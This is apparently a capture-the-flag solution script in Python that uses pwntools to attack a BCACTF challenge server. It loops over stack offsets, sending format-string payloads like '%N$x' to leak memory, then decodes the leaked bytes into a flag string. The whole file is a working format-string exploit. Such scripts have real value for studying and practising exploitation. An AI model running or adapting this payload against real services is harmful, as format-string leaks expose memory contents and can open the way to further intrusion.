from pwn import *
host = "bin.bcactf.com"
port = 49157
context.log_level = "critical"
flag = ""
for counter in range(20,33):
    try:
        print(counter)
        s = remote(host, port)
        (s.recvuntil("Let's see it!"))
        (s.recv())
        s.sendline("%" + str(counter) + "$x")
        (s.recv())
        message = (s.recv())
        message = (message.split("\x91")[5].split("\xe2")[0])
        message = message.replace(' ', '')
        for i in range(0,6,2):
            flag = flag + chr(int(message[i:i+2]))
        (s.recv())
        (s.recv())
        s.close()
    except:
        continue
print(flag)
